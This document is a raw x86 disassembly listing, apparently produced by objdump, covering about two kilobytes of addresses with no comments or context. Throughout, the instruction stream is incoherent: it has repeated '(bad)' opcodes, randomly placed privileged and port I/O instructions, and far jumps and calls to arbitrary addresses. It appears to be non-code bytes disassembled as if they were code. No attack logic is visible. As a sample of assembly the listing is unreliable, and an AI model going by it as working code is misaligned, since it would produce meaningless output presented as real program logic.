  4234cb:	mov    bl,BYTE PTR [edx+ecx*4-0x2c8f6b91]
  4234d2:	xor    ebx,DWORD PTR [ecx+0x28]
  4234d5:	into   
  4234d6:	mov    BYTE PTR [edx+0x3],dl
  4234d9:	inc    ecx
  4234da:	mov    al,ds:0x70804f77
  4234df:	les    esi,FWORD PTR [ebx]
  4234e1:	dec    ebp
  4234e2:	cmp    esi,esp
  4234e4:	(bad)  
  4234e5:	fwait
  4234e6:	pop    eax
  4234e7:	xor    edi,DWORD PTR ss:[edi]
  4234ea:	mov    ecx,0x9b1d955c
  4234ef:	lahf   
  4234f0:	mov    eax,ds:0xc4d055d6
  4234f6:	enter  0xc13,0xac
  4234fa:	pop    edx
  4234fb:	xor    eax,0xf209a91
  423500:	dec    eax
  423501:	or     eax,0xbdfe1d6
  423506:	mov    ah,0x46
  423508:	xchg   edx,eax
  423509:	lahf   
  42350a:	pusha  
  42350b:	adc    eax,DWORD PTR [edx]
  42350d:	div    DWORD PTR [ebx+0x9]
  423510:	mov    ecx,0x2359ef5a
  423515:	jb     0x423543
  423517:	push   cs
  423518:	sub    al,cl
  42351a:	and    dh,bh
  42351c:	jmp    0x423540
  42351e:	push   edi
  42351f:	lahf   
  423520:	repz out dx,al
  423522:	fstp   DWORD PTR [esi-0x2c3b8876]
  423528:	mov    bh,0x4d
  42352a:	jb     0x423587
  42352c:	xlat   BYTE PTR ds:[ebx]
  42352d:	mov    al,0xff
  42352f:	fistp  QWORD PTR [ebx]
  423531:	sub    ebp,DWORD PTR [edx-0x5432d34a]
  423537:	arpl   bp,si
  423539:	in     al,dx
  42353a:	leave  
  42353b:	or     al,0x96
  42353d:	cld    
  42353e:	cmp    al,0x7e
  423540:	jecxz  0x423588
  423542:	loopne 0x4234c4
  423544:	scas   eax,DWORD PTR es:[edi]
  423545:	sahf   
  423546:	dec    BYTE PTR [ebx]
  423548:	test   DWORD PTR [ebx+0x63],ebx
  42354b:	shr    cl,0xe4
  42354e:	sbb    eax,0xd9ecc46b
  423553:	(bad)  
  423554:	test   al,0x8d
  423556:	mov    ebp,0x2cbb7924
  42355b:	jae    0x4235d0
  42355d:	xor    al,0x6e
  42355f:	jae    0x4234e7
  423561:	rcl    dh,cl
  423563:	xchg   edi,eax
  423564:	unpcklps xmm7,XMMWORD PTR [eax+ebx*1]
  423568:	push   esp
  423569:	loopne 0x423588
  42356b:	inc    esi
  42356c:	loop   0x42350b
  42356e:	std    
  42356f:	sub    edx,esp
  423571:	mov    ds,WORD PTR [ecx]
  423573:	shl    BYTE PTR [edx-0x7986b05c],1
  423579:	das    
  42357a:	dec    ecx
  42357b:	call   0xda30:0xa3450064
  423582:	sbb    DWORD PTR [ebx-0x76],ecx
  423585:	arpl   WORD PTR [esi+ecx*1-0x5c],bx
  423589:	mov    BYTE PTR [ebp-0x29],0xd3
  42358d:	arpl   cx,si
  42358f:	add    al,0x86
  423591:	outs   dx,BYTE PTR ds:[esi]
  423592:	jg     0x423522
  423594:	sub    eax,0x8d7b947e
  423599:	mov    ecx,0x1c35d84d
  42359e:	xchg   edx,eax
  42359f:	es jecxz 0x4235e6
  4235a2:	pop    esp
  4235a3:	add    bh,bl
  4235a5:	mov    BYTE PTR [ebp-0x6c140f45],bh
  4235ab:	push   esp
  4235ac:	pop    ecx
  4235ad:	add    ebp,edi
  4235af:	inc    ecx
  4235b0:	fadd   DWORD PTR [edi+0x3fc65b3d]
  4235b6:	stos   BYTE PTR es:[edi],al
  4235b7:	sub    bl,al
  4235b9:	inc    esi
  4235ba:	(bad)
  4235bd:	push   ecx
  4235be:	add    DWORD PTR [edi+ecx*8+0x4d],edi
  4235c2:	repnz xchg ebp,eax
  4235c4:	sub    DWORD PTR [esp+ecx*4-0x67],edi
  4235c8:	sbb    bl,al
  4235ca:	jae    0x4235a7
  4235cc:	jne    0x423631
  4235ce:	sar    BYTE PTR [esi],cl
  4235d0:	lods   al,BYTE PTR ds:[esi]
  4235d1:	cmc    
  4235d2:	or     BYTE PTR [edx],bh
  4235d4:	sub    eax,0xe6a1374
  4235d9:	int3   
  4235da:	pusha  
  4235db:	pop    ecx
  4235dc:	sbb    ebx,DWORD PTR [edx-0x7ccd9022]
  4235e2:	ds hlt 
  4235e4:	lock or eax,0xd43d72d2
  4235ea:	mov    eax,ds:0x5b1a44a2
  4235ef:	inc    ecx
  4235f0:	dec    esi
  4235f1:	or     ecx,DWORD PTR [ebx]
  4235f3:	adc    al,0xea
  4235f5:	xchg   ebx,eax
  4235f6:	dec    edi
  4235f7:	mov    dl,0x96
  4235f9:	sbb    bh,BYTE PTR [ebp+ebp*8+0x68401318]
  423600:	mov    al,ds:0xc814c339
  423605:	dec    ebp
  423606:	add    al,0xbd
  423608:	bound  esp,QWORD PTR [ebx+0x9]
  42360b:	mov    ch,0xae
  42360d:	jb     0x423626
  42360f:	adc    DWORD PTR [esi+0x6],0xcd0b4b6f
  423616:	sub    al,0x43
  423618:	adc    bh,BYTE PTR [edx-0x7b65f11]
  42361e:	fnstenv [ebx+0x69]
  423621:	dec    BYTE PTR [ebx-0x29859764]
  423627:	mov    dl,dh
  423629:	cmp    bl,bl
  42362b:	cmpxchg DWORD PTR [ebx+eax*2],edi
  42362f:	ja     0x42368d
  423631:	pop    esp
  423632:	and    ebx,DWORD PTR [edx-0x55]
  423635:	or     ah,BYTE PTR [eax+ebx*8]
  423638:	dec    ecx
  423639:	dec    edx
  42363a:	arpl   WORD PTR [edi+ebx*2+0x4d8669e0],ax
  423641:	push   ecx
  423642:	int    0x22
  423644:	jne    0x42366a
  423646:	retf   0xc143
  423649:	xchg   esi,eax
  42364a:	and    al,0x78
  42364c:	cmc    
  42364d:	sbb    al,0x81
  42364f:	scas   al,BYTE PTR es:[edi]
  423650:	pop    ebp
  423651:	jb     0x423632
  423653:	mov    eax,0xa381ddf4
  423658:	ret    
  423659:	and    cl,BYTE PTR [esi-0x6d]
  42365c:	pop    eax
  42365d:	push   eax
  42365e:	xor    al,0xe3
  423660:	cld    
  423661:	test   DWORD PTR [eax+0x26f0f03f],esp
  423667:	mov    eax,ds:0xc36abb87
  42366c:	imul   edi,DWORD PTR [eax+0x6550352e],0xffffff82
  423673:	add    al,0x53
  423675:	jge    0x423637
  423677:	popa   
  423678:	dec    BYTE PTR [ecx]
  42367a:	lea    esi,[eax-0x4fcdeec0]
  423680:	imul   edi,DWORD PTR [esi-0x76],0x9c0e2832
  423687:	test   eax,0x86582416
  42368c:	aaa    
  42368d:	cmc    
  42368e:	pop    es
  42368f:	pop    ebx
  423690:	je     0x4236f0
  423692:	mov    ecx,0x996c0b53
  423697:	add    DWORD PTR [edx+0x72],ebp
  42369a:	sbb    eax,0x962e2cdb
  42369f:	sbb    BYTE PTR [ecx+eiz*2],0xbb
  4236a3:	jae    0x423702
  4236a5:	out    dx,al
  4236a6:	fidiv  DWORD PTR [edx+0x7b]
  4236a9:	nop
  4236aa:	add    BYTE PTR ds:0x50d4fb68,bh
  4236b0:	lea    edi,[ebp+0x2d]
  4236b3:	repnz xchg edi,eax
  4236b5:	mov    DWORD PTR [esi],ebp
  4236b7:	outs   dx,DWORD PTR ds:[esi]
  4236b8:	stc    
  4236b9:	sar    ah,1
  4236bb:	rdtsc  
  4236bd:	xor    al,0xf4
  4236c0:	or     al,0x35
  4236c2:	xchg   esp,eax
  4236c3:	leave  
  4236c4:	sub    BYTE PTR [esi+0xe5bb0b7],bh
  4236ca:	js     0x4236a8
  4236cc:	fiadd  DWORD PTR [bp-0x18]
  4236d0:	add    ebx,DWORD PTR [edx+0x236a84c8]
  4236d6:	mov    al,0xc7
  4236d8:	popaw  
  4236da:	mov    ch,0x76
  4236dc:	ds retf 0x47ff
  4236e0:	jle    0x42367b
  4236e2:	jbe    0x423733
  4236e4:	clc    
  4236e5:	sbb    eax,0x1f5fc2af
  4236ea:	rcr    BYTE PTR [ecx-0x7e],1
  4236ed:	adc    DWORD PTR [edi+0x59dd234d],esi
  4236f3:	dec    ecx
  4236f4:	jmp    0x423739
  4236f6:	dec    ecx
  4236f7:	dec    edi
  4236f8:	pop    ecx
  4236f9:	pop    ebp
  4236fa:	dec    esi
  4236fb:	das    
  4236fc:	popf   
  4236fd:	mov    ecx,0x75e74827
  423702:	mov    edx,0xc31899ff
  423707:	lods   eax,DWORD PTR ds:[esi]
  423708:	cmp    bh,dl
  42370a:	clc    
  42370b:	test   DWORD PTR [ebp-0xe],0x8ba83164
  423712:	(bad)  
  423713:	in     eax,0xc6
  423715:	jbe    0x423789
  423717:	add    esi,esp
  423719:	mov    bl,0xf9
  42371b:	mov    fs,esp
  42371d:	lahf   
  42371e:	jp     0x423753
  423720:	push   cs
  423721:	push   eax
  423722:	cli    
  423723:	aas    
  423724:	aaa    
  423725:	int3   
  423726:	data16 sbb dl,BYTE PTR gs:[ebx+0x57784289]
  42372e:	in     al,0xa6
  423730:	aaa    
  423731:	pop    ss
  423732:	stc    
  423733:	mov    edi,0xeca1ef3f
  423738:	sbb    DWORD PTR [esi],eax
  42373a:	sbb    BYTE PTR [ebx-0xa],cl
  42373d:	pop    ss
  42373e:	mov    eax,0x29526153
  423743:	cli    
  423744:	ret    
  423745:	or     BYTE PTR [ebx-0x5c],bl
  423748:	test   eax,0x177d6895
  42374d:	not    edx
  42374f:	mov    WORD PTR [edx],?
  423751:	daa    
  423752:	xor    BYTE PTR [ecx],0x98
  423755:	lds    eax,FWORD PTR [ecx]
  423757:	dec    DWORD PTR [edx-0x2]
  42375a:	lods   al,BYTE PTR ds:[esi]
  42375b:	stos   DWORD PTR es:[edi],eax
  42375c:	pop    ecx
  42375d:	jge    0x4236e7
  42375f:	cmp    BYTE PTR [ebx],ah
  423761:	ror    BYTE PTR [ebx],cl
  423763:	aaa    
  423764:	dec    edi
  423765:	pop    esp
  423766:	xchg   BYTE PTR [ecx-0x3d05aaf7],ah
  42376c:	daa    
  42376d:	pop    ecx
  42376e:	cmc    
  42376f:	add    al,0x61
  423771:	ins    DWORD PTR es:[edi],dx
  423772:	data16 ss jae 0x42370a
  423776:	loop   0x423758
  423778:	pop    esp
  423779:	imul   edi,ecx,0xffffff97
  42377c:	dec    esp
  42377d:	sahf   
  42377e:	jle    0x4237d1
  423780:	(bad)  
  423782:	inc    ebx
  423783:	sar    BYTE PTR [ebx+esi*8],cl
  423786:	jns    0x42370b
  423788:	or     bh,bh
  42378a:	jp     0x4237f8
  42378c:	scas   eax,DWORD PTR es:[edi]
  42378d:	xor    DWORD PTR [edx],0x9cf29c70
  423793:	popf   
  423794:	icebp  
  423795:	xor    BYTE PTR ds:0x2e6b322a,bh
  42379b:	mov    dl,BYTE PTR [ebp-0x64]
  42379e:	mov    ah,0xaf
  4237a0:	aas    
  4237a1:	mov    ch,0x8d
  4237a3:	or     eax,0x10c6f11
  4237a8:	fldcw  WORD PTR [ebx+0x301be219]
  4237ae:	js     0x4237e0
  4237b0:	aaa    
  4237b1:	int    0x3f
  4237b3:	jns    0x4237b4
  4237b5:	cld    
  4237b6:	or     eax,0x19af8741
  4237bb:	xchg   esi,eax
  4237bc:	es cli 
  4237be:	int3   
  4237bf:	fucomip st,st(6)
  4237c1:	call   0xaf5adc89
  4237c6:	jae    0x423755
  4237c8:	mov    ah,0x33
  4237ca:	sbb    DWORD PTR [ebp+0x7723f85],eax
  4237d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237d1:	ficomp WORD PTR [eax]
  4237d3:	push   edx
  4237d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237d5:	jge    0x42380a
  4237d7:	scas   al,BYTE PTR es:[edi]
  4237d8:	mov    eax,0x2f465a17
  4237dd:	inc    edi
  4237de:	xchg   edx,eax
  4237df:	xchg   esi,eax
  4237e0:	ins    BYTE PTR es:[edi],dx
  4237e1:	clc    
  4237e2:	mov    dl,0x95
  4237e4:	push   ecx
  4237e5:	or     DWORD PTR [edi-0x1c],0x20
  4237e9:	fsubr  QWORD PTR [edx-0x3d]
  4237ec:	test   BYTE PTR [ecx+0x9f45657],0xb
  4237f3:	pop    eax
  4237f4:	pushf  
  4237f5:	lods   al,BYTE PTR ds:[esi]
  4237f6:	retf   
  4237f7:	pop    es
  4237f8:	pop    ecx
  4237f9:	popf   
  4237fa:	pusha  
  4237fb:	xor    al,0x9b
  4237fd:	cmp    DWORD PTR [ecx],esp
  4237ff:	dec    ecx
  423800:	(bad)  
  423801:	call   FWORD PTR [eax+0x32]
  423804:	xor    BYTE PTR [edi],0xed
  423807:	dec    esp
  423808:	jb     0x423840
  42380a:	out    0xc7,eax
  42380c:	cwde   
  42380d:	fnsavew [ebp-0x59188171]
  423814:	xchg   ebx,eax
  423815:	xor    ebp,DWORD PTR [ebp-0x14]
  423818:	add    bh,BYTE PTR [edi]
  42381a:	mov    fs:0x9e051661,eax
  423820:	(bad)  
  423821:	xchg   edx,eax
  423822:	xchg   edx,eax
  423823:	push   esp
  423824:	adc    eax,0x1286300e
  423829:	outs   dx,DWORD PTR ds:[esi]
  42382a:	jnp    0x423863
  42382c:	push   cs
  42382d:	mov    ebx,0x47bc9fdd
  423832:	cmp    BYTE PTR [edi+0x57],bh
  423835:	js     0x4238a1
  423837:	mov    eax,0x3f1f5723
  42383c:	jmp    0x1ee70a66
  423841:	jp     0x4237d2
  423843:	test   al,0xed
  423845:	fdivp  st(7),st
  423847:	add    al,0xb9
  423849:	add    al,0x7e
  42384b:	repnz into 
  42384d:	lahf   
  42384e:	pushf  
  42384f:	fcmovnbe st,st(5)
  423851:	add    bl,dl
  423853:	cmp    DWORD PTR [eax+0x4d2e7973],eax
  423859:	adc    edi,DWORD PTR [ebp+0x3c]
  42385c:	pop    ds
  42385d:	xchg   BYTE PTR [ebx-0x6c01440],ch
  423863:	retf   0x4e6
  423866:	mov    dl,0x8c
  423868:	lods   eax,DWORD PTR ds:[esi]
  423869:	aam    0x4e
  42386b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42386c:	mov    edx,0xa93b636b
  423871:	adc    eax,0xa4f8d642
  423876:	pushf  
  423877:	fwait
  423878:	adc    eax,0xa4ab942d
  42387d:	jmp    0x4238a6
  42387f:	mov    bh,0x4a
  423881:	push   edx
  423882:	adc    DWORD PTR [ebx-0x366a1999],esp
  423888:	gs dec ecx
  42388a:	sbb    al,0xd
  42388c:	lock inc ebp
  42388e:	(bad)  
  42388f:	aas    
  423890:	in     al,dx
  423891:	mov    DWORD PTR [esi+0x77ecdab8],0x727584d8
  42389b:	xor    al,0x9a
  42389d:	cmp    DWORD PTR [ebx-0x7471f443],ebp
  4238a3:	lods   eax,DWORD PTR ds:[esi]
  4238a4:	mov    cl,0x39
  4238a6:	scas   al,BYTE PTR es:[edi]
  4238a7:	and    BYTE PTR [edx-0x2f5a663d],0x83
  4238ae:	fbstp  TBYTE PTR [ebx+0x345dff76]
  4238b4:	leave  
  4238b5:	cld    
  4238b6:	dec    ebp
  4238b7:	cmc    
  4238b8:	xor    bh,BYTE PTR [ecx-0x58]
  4238bb:	xlat   BYTE PTR ds:[ebx]
  4238bc:	dec    edx
  4238bd:	stos   BYTE PTR es:[edi],al
  4238be:	shr    BYTE PTR [esi+0x4b],0x82
  4238c2:	xor    bl,BYTE PTR [edi-0x4a]
  4238c5:	xor    DWORD PTR [ecx],edx
  4238c7:	cdq    
  4238c8:	pop    esi
  4238c9:	outs   dx,BYTE PTR ds:[esi]
  4238ca:	sub    eax,0x9ff000de
  4238cf:	mov    dl,0x13
  4238d1:	pop    edi
  4238d2:	pop    ebx
  4238d3:	repnz mov ch,0x3e
  4238d6:	test   BYTE PTR gs:[eax-0x68],ah
  4238da:	das    
  4238db:	xchg   ebp,eax
  4238dc:	adc    ah,BYTE PTR [edx]
  4238de:	xor    BYTE PTR [eax-0x1c],0x60
  4238e2:	std    
  4238e3:	push   edx
  4238e4:	leave  
  4238e5:	adc    ebp,ebp
  4238e7:	js     0x4238ce
  4238e9:	mov    bh,0xe
  4238eb:	enter  0x12db,0xc8
  4238ef:	rcr    BYTE PTR [ebp-0x51],cl
  4238f2:	das    
  4238f3:	push   edi
  4238f4:	add    eax,0xc2eb6b9b
  4238f9:	dec    edx
  4238fa:	arpl   bx,bx
  4238fc:	icebp  
  4238fd:	mov    bh,0x13
  423900:	fcom   DWORD PTR [ebx]
  423902:	out    0x18,eax
  423904:	push   edx
  423905:	jae    0x4238c0
  423907:	in     eax,0x1
  423909:	(bad)  
  42390a:	(bad)  
  42390b:	icebp  
  42390c:	dec    edi
  42390d:	in     al,dx
  42390e:	mov    dl,BYTE PTR [ebp+0x690f8407]
  423914:	sbb    edx,ebx
  423916:	lea    ebp,[edi]
  423918:	jno    0x4238bb
  42391a:	out    dx,eax
  42391b:	loope  0x423944
  42391d:	stc    
  42391e:	or     esp,DWORD PTR ds:0x40f72d6a
  423924:	fdivr  QWORD PTR [ebp-0x46b5e96a]
  42392a:	add    al,0x77
  42392c:	cmp    BYTE PTR ds:0x1df8c132,0xcc
  423933:	ins    DWORD PTR es:[edi],dx
  423934:	inc    ecx
  423935:	sbb    eax,0x2b3a5279
  42393a:	adc    al,0x1a
  42393c:	ret    
  42393d:	cmp    dl,ah
  42393f:	lods   al,BYTE PTR ds:[esi]
  423940:	in     al,0xd
  423942:	(bad)  
  423943:	div    BYTE PTR [eax+0x257a20a2]
  423949:	sub    ebx,ecx
  42394b:	xchg   BYTE PTR [esi-0x390d6868],dh
  423951:	adc    eax,0xd6161a41
  423956:	sub    edx,ecx
  423958:	push   cs
  423959:	dec    ebx
  42395a:	xchg   ebp,eax
  42395b:	nop
  42395c:	pop    edi
  42395d:	out    dx,eax
  42395e:	test   DWORD PTR [edi+0x11],edi
  423961:	leave  
  423962:	and    dh,bl
  423964:	scas   al,BYTE PTR es:[edi]
  423965:	mov    ds:0x6ad82553,eax
  42396a:	jecxz  0x4238f9
  42396c:	and    al,dh
  42396e:	mov    edi,0x285ae08f
  423973:	mov    bl,0x68
  423975:	mov    WORD PTR [ebx-0x12],es
  423978:	pop    ecx
  423979:	dec    eax
  42397a:	mov    eax,0xb1e74a5a
  42397f:	jo     0x4239c6
  423981:	stos   DWORD PTR es:[edi],eax
  423982:	mov    ch,0xd9
  423984:	mov    ds,eax
  423986:	cmp    DWORD PTR [ebx+esi*2+0x49],eax
  42398a:	pop    ebx
  42398b:	jae    0x42395d
  42398d:	in     al,0x37
  42398f:	loope  0x423958
  423991:	adc    BYTE PTR [ebp+0xa4bcb5],0xc3
  423998:	mov    ebx,0x49966a00
  42399e:	mov    ebp,0xc82c1e02
  4239a3:	ficom  DWORD PTR [ecx]
  4239a5:	inc    ebp
  4239a6:	out    dx,eax
  4239a7:	pop    ss
  4239a8:	cmc    
  4239a9:	pusha  
  4239aa:	mov    esi,0x9ea29e40
  4239af:	mov    DWORD PTR [ebx],ebx
  4239b1:	xor    DWORD PTR [ebx+0x41],edi
  4239b4:	push   ss
  4239b5:	inc    ebx
  4239b6:	push   0xffffffc4
  4239b8:	stos   DWORD PTR es:[edi],eax
  4239b9:	adc    dl,BYTE PTR [eax]
  4239bb:	outs   dx,DWORD PTR ds:[esi]
  4239bc:	adc    DWORD PTR [ecx-0x51],ebp
  4239bf:	in     eax,dx
  4239c0:	imul   edi,DWORD PTR [ebp+ebx*1-0x5143c971],0xdc9181c2
  4239cb:	popa   
  4239cc:	fwait
  4239cd:	xor    eax,0x1808c7cd
  4239d2:	fist   WORD PTR [ebp-0x42]
  4239d5:	push   ds
  4239d6:	sub    DWORD PTR ds:0x54196660,0x76
  4239dd:	push   0x5fed6ad9
  4239e2:	mov    ds:0x39145d73,eax
  4239e7:	pusha  
  4239e8:	mov    eax,ds:0x4ff31793
  4239ed:	add    DWORD PTR [edx],esi
  4239ef:	or     al,0xb5
  4239f1:	in     al,dx
  4239f2:	in     eax,0x30
  4239f4:	call   0xb0d889
  4239f9:	add    eax,0x9a6dfa6d
  4239fe:	out    dx,al
  4239ff:	adc    al,0x4f
  423a01:	add    edi,0x1bad8364
  423a07:	fxtract 
  423a09:	shr    DWORD PTR [ebp-0x5849d367],cl
  423a0f:	retf   0xdea8
  423a12:	loop   0x423a88
  423a14:	jbe    0x423a04
  423a16:	sbb    DWORD PTR [edx],ebx
  423a18:	pop    ebp
  423a19:	mov    dl,0x4a
  423a1b:	stc    
  423a1c:	not    ebp
  423a1e:	fs dec edi
  423a20:	mov    ds:0xcd1fd4c5,al
  423a25:	jle    0x4239e8
  423a27:	pop    edi
  423a28:	push   eax
  423a29:	stc    
  423a2a:	rol    edx,cl
  423a2c:	in     al,0x63
  423a2e:	add    ecx,DWORD PTR es:[esi+0x6dfed6a]
  423a35:	dec    ebx
  423a36:	shl    BYTE PTR [ebx],cl
  423a38:	rol    bl,cl
  423a3a:	push   ebx
  423a3b:	call   0xe246:0xc866a1ea
  423a42:	hlt    
  423a43:	and    al,0x2d
  423a45:	retf   0x50b3
  423a48:	fistp  QWORD PTR [ebp-0x48]
  423a4b:	cmc    
  423a4c:	imul   esi,DWORD PTR [ebp+0x2b39389c],0x1
  423a53:	ins    DWORD PTR es:[edi],dx
  423a54:	loope  0x423ab5
  423a56:	inc    eax
  423a57:	cld    
  423a58:	ins    DWORD PTR es:[edi],dx
  423a59:	call   0xa9c866df
  423a5e:	(bad)  
  423a5f:	hlt    
  423a60:	(bad)  
  423a61:	dec    ebp
  423a62:	sub    DWORD PTR [edi+0x32],edx
  423a65:	xchg   DWORD PTR [esi+0x2ae51b00],esi
  423a6b:	sbb    BYTE PTR [ebp+0x3ee08972],cl
  423a71:	inc    esi
  423a72:	dec    ebx
  423a73:	adc    bh,cl
  423a75:	test   cl,cl
  423a77:	das    
  423a78:	jmp    0x61fa3200
  423a7d:	cld    
  423a7e:	idiv   bh
  423a80:	lods   eax,DWORD PTR ds:[esi]
  423a81:	dec    ebp
  423a82:	inc    edi
  423a83:	lods   al,BYTE PTR ds:[esi]
  423a84:	scas   al,BYTE PTR es:[edi]
  423a85:	repz mov bl,0x66
  423a88:	fiadd  DWORD PTR [esi+eax*8-0x36]
  423a8c:	(bad)  
  423a8d:	jns    0x423a84
  423a8f:	es dec ecx
  423a91:	sbb    DWORD PTR [esi],ecx
  423a93:	arpl   bx,dx
  423a95:	ins    DWORD PTR es:[edi],dx
  423a96:	pop    ebx
  423a97:	shl    cl,1
  423a99:	dec    esp
  423a9a:	pop    ebp
  423a9b:	jae    0x423b17
  423a9d:	xchg   esi,eax
  423a9e:	ret    
  423a9f:	shl    BYTE PTR [esi],0x25
  423aa2:	xchg   edx,eax
  423aa3:	jge    0x423ac5
  423aa5:	mov    ch,0xb4
  423aa7:	dec    eax
  423aa8:	mov    al,ds:0x7d4ecb3a
  423aad:	mov    fs,WORD PTR [ebp-0x45]
  423ab0:	jne    0x423a50
  423ab2:	xor    esp,DWORD PTR fs:0x1ab3ce48
  423ab9:	ja     0x423aea
  423abb:	xchg   edx,eax
  423abc:	xchg   ebp,eax
  423abd:	and    ebx,DWORD PTR [esi+0x4]
  423ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ac1:	push   edi
  423ac2:	imul   ebx,edi,0xffffffa6
  423ac5:	mov    al,ds:0x4adb2d9e
  423aca:	cld    
  423acb:	fist   DWORD PTR [ebx+0x1a685109]
  423ad1:	mov    ecx,0xf8363e17
  423ad6:	repz dec eax
  423ad8:	jl     0x423b36
  423ada:	ja     0x423aa6
  423adc:	and    ah,ah
  423ade:	neg    BYTE PTR [esi+0x60]
  423ae1:	push   ss
  423ae2:	push   ebx
  423ae3:	out    dx,eax
  423ae4:	adc    ebx,DWORD PTR [edx+eax*1+0x77]
  423ae8:	xchg   al,bh
  423aea:	push   esp
  423aeb:	lods   al,BYTE PTR ds:[esi]
  423aec:	mov    DWORD PTR [esi],edi
  423aee:	mov    esp,0x9379d3d5
  423af3:	retf   0xf464
  423af6:	xchg   ebp,eax
  423af7:	das    
  423af8:	sahf   
  423af9:	fist   DWORD PTR [ebp-0x50]
  423afc:	sbb    BYTE PTR [eax+0x68],ch
  423aff:	stos   BYTE PTR es:[edi],al
  423b00:	sbb    eax,0xc16df5d5
  423b05:	test   eax,0x983c1c10
  423b0a:	test   DWORD PTR [edx],edx
  423b0c:	add    al,0x93
  423b0e:	mov    ah,0xbf
  423b10:	sub    ebp,DWORD PTR [ebx]
  423b12:	jg     0x423b6f
  423b14:	fwait
  423b15:	jmp    0xe6aa:0x86ac6f98
  423b1c:	and    BYTE PTR [ebp+ebp*8+0xc],bh
  423b20:	mov    ds:0x551e1e6d,eax
  423b25:	lock inc edi
  423b27:	arpl   sp,cx
  423b29:	lods   eax,DWORD PTR ds:[esi]
  423b2a:	rcr    BYTE PTR [edi+0x3b0b5625],0xbe
  423b31:	loopne 0x423b2a
  423b33:	neg    BYTE PTR [edi]
  423b35:	push   edi
  423b36:	stc    
  423b37:	inc    edi
  423b38:	fwait
  423b39:	push   eax
  423b3a:	out    dx,eax
  423b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b3c:	and    ebp,DWORD PTR [edi]
  423b3e:	adc    ah,BYTE PTR [edx]
  423b40:	mov    edx,0xf232c3fd
  423b45:	call   0xd4f7:0xce62b4c8
  423b4c:	and    bl,BYTE PTR [ebx+0x14]
  423b4f:	cmp    esp,ebp
  423b51:	aas    
  423b52:	test   eax,0xde1d847e
  423b57:	pop    es
  423b58:	jmp    0x56954cd9
  423b5d:	test   DWORD PTR [ecx-0x51],edi
  423b60:	xchg   BYTE PTR [eax+0x2ca2fab5],ch
  423b66:	clc    
  423b67:	mov    dl,0xe8
  423b69:	gs (bad) 
  423b6c:	std    
  423b6d:	dec    edx
  423b6e:	imul   eax,DWORD PTR [ebp+0x59ef690a],0x7f
  423b75:	test   DWORD PTR [esi],ecx
  423b77:	ret    
  423b78:	dec    DWORD PTR [edi]
  423b7a:	in     al,dx
  423b7b:	(bad)  
  423b7c:	mov    ds:0x3579f678,al
  423b81:	cli    
  423b82:	and    BYTE PTR [ebp-0x50efbf18],al
  423b88:	xor    DWORD PTR [ebp-0x6923049c],ebp
  423b8e:	push   es
  423b8f:	cmp    al,0x71
  423b91:	mov    esi,0x60389793
  423b96:	repz pop ds
  423b98:	retf   0x4912
  423b9b:	and    al,0xe
  423b9d:	das    
  423b9e:	ret    0x13f2
  423ba1:	mov    eax,ds:0x459afc0e
  423ba6:	adc    dh,cl
  423ba8:	xchg   ebx,eax
  423ba9:	or     edx,DWORD PTR [ecx+ecx*8+0xf]
  423bad:	int3   
  423bae:	xchg   ebp,eax
  423baf:	call   0x80a5a931
  423bb4:	jae    0x423b66
  423bb6:	rcr    BYTE PTR [edi+0x442e196e],0xb5
  423bbd:	and    DWORD PTR [eax+0x4e],eax
  423bc0:	(bad)  
  423bc1:	aad    0xe
  423bc3:	and    edx,DWORD PTR [esi]
  423bc5:	push   esi
  423bc6:	cdq    
  423bc7:	inc    eax
  423bc8:	add    al,0xc
  423bca:	ficomp WORD PTR [ebx-0x12]
  423bcd:	js     0x423c0a
  423bcf:	push   ebx
  423bd0:	jmp    0x8582:0x9afbec0a
  423bd7:	les    ebx,FWORD PTR [edi+0x66b289c5]
  423bdd:	xchg   esi,eax
  423bde:	lea    ebp,[ecx-0x49]
  423be1:	fimul  WORD PTR [ecx+0x5e]
  423be4:	iret   
  423be5:	push   ds
  423be6:	cli    
  423be7:	jb     0x423c25
  423be9:	sti    
  423bea:	div    bl
  423bec:	int    0xdb
  423bee:	int3   
  423bef:	sbb    BYTE PTR [eax-0x2a75d590],ch
  423bf5:	add    al,0x7d
  423bf7:	inc    ecx
  423bf8:	bound  esp,QWORD PTR [edi]
  423bfa:	pop    ebp
  423bfb:	(bad)  
  423bfc:	cmp    bl,ah
  423bfe:	cdq    
  423bff:	dec    BYTE PTR [eax]
  423c01:	cmp    eax,0x5a7e3620
  423c06:	mov    eax,ds:0x73f623db
  423c0b:	loopne 0x423bf7
  423c0d:	dec    ebx
  423c0e:	mov    ecx,0x61bae2d3
  423c13:	push   ss
  423c14:	mov    edx,0x7b20f88b
  423c19:	jecxz  0x423c2e
  423c1b:	outs   dx,DWORD PTR ds:[esi]
  423c1c:	cld    
  423c1d:	adc    eax,0xc383d37e
  423c22:	cmc    
  423c23:	in     eax,0xee
  423c25:	mov    es,edi
  423c27:	and    edi,DWORD PTR [ebp+0x34]
  423c2a:	sbb    eax,0xabb46565
  423c2f:	aad    0xa5
  423c31:	fwait
  423c32:	pushf  
  423c33:	xor    esp,DWORD PTR [ebp-0x1c]
  423c36:	mov    cs:0x7d63e450,eax
  423c3c:	or     BYTE PTR [esi],dl
  423c3e:	std    
  423c3f:	test   BYTE PTR [eax+0x3b],dl
  423c42:	inc    edx
  423c43:	repz ficom WORD PTR [edi-0x78]
  423c47:	lock cdq 
  423c49:	lock (bad) 
  423c4b:	pop    ss
  423c4c:	jmp    0x423c80
  423c4e:	sub    eax,0x403169f7
  423c53:	jmp    0x5874e43f
  423c58:	sbb    bh,bl
  423c5a:	stos   BYTE PTR es:[edi],al
  423c5b:	jne    0x423c05
  423c5d:	mov    dl,0xc8
  423c5f:	and    edi,edx
  423c61:	hlt    
  423c62:	mov    ds:0x78e57e51,eax
  423c67:	jmp    0x8a374d95
  423c6c:	adc    BYTE PTR [eax],ch
  423c6e:	push   edx
  423c6f:	jbe    0x423c0f
  423c71:	shl    DWORD PTR [ecx-0x6f],cl
  423c74:	sub    DWORD PTR [ebx-0x5ade37f2],ebx
  423c7a:	(bad)
  423c7d:	(bad)  
  423c7e:	push   cs
  423c7f:	sbb    BYTE PTR [ebx],cl
  423c81:	pop    eax
  423c82:	scas   al,BYTE PTR es:[edi]
  423c83:	and    eax,DWORD PTR [esi-0x39cfc739]
